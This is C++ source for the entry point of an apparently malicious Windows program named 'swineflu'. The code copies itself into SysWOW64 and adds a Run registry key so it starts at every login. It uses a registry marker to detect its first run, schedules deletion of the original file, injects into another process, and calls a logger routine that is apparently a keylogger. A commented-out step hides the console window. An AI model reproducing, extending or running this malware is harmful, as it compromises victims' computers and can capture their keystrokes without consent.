// swineflu.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <string.h>


#include <sstream>
#include <string>

#include "Shlwapi.h"


#include <iostream>
using namespace std;
#include "svchost.h"
#include <tchar.h>

#include "Common.h"
using namespace InjecteeFuncs;

#include <DbgHelp.h>




string ExePath() {
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	return string(buffer).substr(0, pos);
}

void addStartUpEntry()
{
	RegSetKeyValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, "C:\\Windows\\SysWOW64\\swineflu.exe", strlen("C:\\Windows\\SysWOW64\\swineflu.exe") + 1);
}


void adminstartup()
{
	HKEY hkey;
	DWORD dwDispoition;

	string str = ExePath();
	str.append("\\swineflu.exe");

	BOOL b = CopyFile(str.c_str(),
		"C:\\Windows\\SysWOW64\\swineflu.exe", 0);
	if (!b) {

		
		
		printf("%d\n", GetLastError());
	}
	else {
		printf("okay\n");
	}	
}

void firstTimeRunCheck()
{
	string str = ExePath();
	printf(str.c_str());
	str.append("\\swineflu.exe");

	string swine_name = "swinef2";
	
	HKEY hKey = NULL;
	DWORD rtime;

	//Step 1: Open the key
	long sts = RegOpenKeyEx(HKEY_CURRENT_USER, "swinef3", 0, KEY_READ, &hKey);

	//Step 2: If failed, create the key
	if (ERROR_NO_MATCH == sts || ERROR_FILE_NOT_FOUND == sts)
	{
		cout << "Creating registry key " << "swinef3" << endl;

		long j = RegCreateKeyEx(HKEY_CURRENT_USER, "swinef3", 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

		

		if (ERROR_SUCCESS != j)
			cout << "Error: Could not create registry key " << "swinef2" << endl << "\tERROR: " << j << endl;
		else
			cout << "Success: Key created" << endl;

		rtime = 0;

		printf("created reg key");

		adminstartup();

		addStartUpEntry();
		
		MoveFileEx(str.c_str(), // Source File.
			0, // Destination as null.
			MOVEFILE_DELAY_UNTIL_REBOOT);


		}
	else
	{
		printf("reg exists");
	}
}

void injectMethod()
{
	int process_id = MyInjecteeFuncs::getNextProcessID(0);
	printf("Starting injections with process: %d\n", process_id);
	MyInjecteeFuncs::inject(process_id);
	printf("\n %d", process_id);
}



int _tmain(int argc, _TCHAR* argv[])
{
	//HWND stealth; /*creating stealth (window is not visible)*/
	//AllocConsole();
	//stealth = FindWindowA("ConsoleWindowClass", NULL);
	//ShowWindow(stealth, 0);
	printf("wear your mask please\n");
	firstTimeRunCheck();
	injectMethod();
	logger();

	getchar();
	return 0;
}




